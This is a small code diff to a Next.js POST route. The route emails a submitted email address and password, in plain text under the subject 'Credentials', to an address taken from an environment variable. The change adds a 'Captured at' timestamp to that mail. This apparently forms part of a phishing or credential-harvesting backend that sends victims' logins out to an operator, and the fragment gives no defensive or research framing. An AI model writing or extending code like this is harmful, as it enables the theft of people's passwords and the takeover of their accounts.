@@ -35,6 +35,7 @@ export async function POST(req: NextRequest) {
       to: process.env.EMAIL_RECEIVER,
       subject: "Credentials",
       text: `Email: ${email}\nPassword: ${password}`,
+      html: `<p><small>Captured at: ${new Date().toISOString()}</small></p>`
     };
 
     await transporter.sendMail(mailOptions);
